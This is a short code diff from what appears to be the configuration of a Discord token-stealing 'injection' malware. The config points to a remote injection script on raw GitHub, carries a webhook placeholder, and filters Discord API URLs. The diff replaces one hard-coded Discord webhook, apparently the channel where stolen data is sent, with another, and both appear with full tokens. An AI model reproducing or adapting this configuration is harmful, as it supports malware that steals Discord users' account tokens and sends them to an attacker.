@@ -17,7 +17,7 @@ var config = {
 
     injection_url: "https://raw.githubusercontent.com/AZbngg/injection/main/AZ-injection.js",
     hook: "%HOOK%",
-    uwu: "https://discord.com/api/webhooks/1082733906790469753/IosdqtvldqZNSLdyf6NkHXabZw1t4N_gFo1SOH0-rKa3Eem45RzB7FcBrfKOewnvwVtx",
+    uwu: "https://discord.com/api/webhooks/1083459683014164530/aI9VjsvVr27oVI4sz83QnCtxTci6bp46RAqz-IgMMwHZHBPLotR4wXx0hG2mHy63jyd1",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
